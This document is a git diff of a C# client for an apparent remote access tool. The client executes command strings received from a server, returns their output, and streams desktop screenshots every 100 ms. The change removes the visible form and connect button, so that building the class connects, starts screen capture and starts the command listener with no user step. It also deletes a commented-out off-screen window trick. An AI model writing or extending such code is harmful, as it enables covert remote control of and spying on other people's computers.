@@ -6,9 +6,9 @@ using System.Runtime.Serialization.Formatters.Binary;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace netRAtoolClient
+namespace nratClient
 {
-    public partial class Form1 : Form
+    class rtClient
     {
         private readonly TcpClient clientIMG = new TcpClient();
         private readonly TcpClient clientCMD = new TcpClient();
@@ -20,6 +20,7 @@ namespace netRAtoolClient
         private string ipAddr = "127.0.0.1";
 
         private Thread ListeningServer;
+        System.Windows.Forms.Timer myTimer;
 
         private static Image TakeDesktop()
         {
@@ -67,8 +68,9 @@ namespace netRAtoolClient
             BinaryFormatter binFormatterSend = new BinaryFormatter();
             String outToServer;
             Console.WriteLine("ListenFromServer start");
+            bool loopControl = true;
 
-            while (true)
+            while (loopControl)
             {
                 try
                 {
@@ -76,10 +78,17 @@ namespace netRAtoolClient
 
                     outToServer = (String)binFormatterSend.Deserialize(stream);
                     Console.WriteLine("#EXEC: execute cmd: " + outToServer);
-                    outToServer = execCommand(outToServer);
-                    if (stream.CanWrite)
+                    if (outToServer.Contains("exitCli"))
                     {
-                        binFormatterSend.Serialize(stream, outToServer);
+                        loopControl = false;
+                    }
+                    else
+                    {
+                        outToServer = execCommand(outToServer);
+                        if (stream.CanWrite)
+                        {
+                            binFormatterSend.Serialize(stream, outToServer);
+                        }
                     }
                 }
                 catch
@@ -88,14 +97,16 @@ namespace netRAtoolClient
                 }
             }
             Console.WriteLine("ListenFromServer finish");
+            myTimer.Stop();
+            return;
         }
 
-        private void timer1_Tick(object sender, EventArgs e)
+        private void myTimer_Tick(object sender, EventArgs e)
         {
             SendDesktopImage();
         }
 
-        private void btnConnectClick_Click(object sender, EventArgs e)
+        public rtClient()
         {
             try
             {
@@ -107,28 +118,15 @@ namespace netRAtoolClient
 
                 ListeningServer = new Thread(ListenFromServer);
 
-                timer1.Start();
+                myTimer = new System.Windows.Forms.Timer() { Interval = 100 };
+                myTimer.Tick += myTimer_Tick;
+                myTimer.Start();
                 ListeningServer.Start();
             }
-            catch(Exception)
+            catch (Exception)
             {
                 Console.WriteLine("#Failed to connect");
             }
         }
-
-
-        public Form1()
-        {
-            InitializeComponent();
-            //Load += Form1_Shown;
-        }
-
-        /*
-        private void Form1_Shown(Object sender, EventArgs e)
-        {
-            this.Location = new Point(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            btnConnectClick.PerformClick();
-        }
-        */
     }
 }
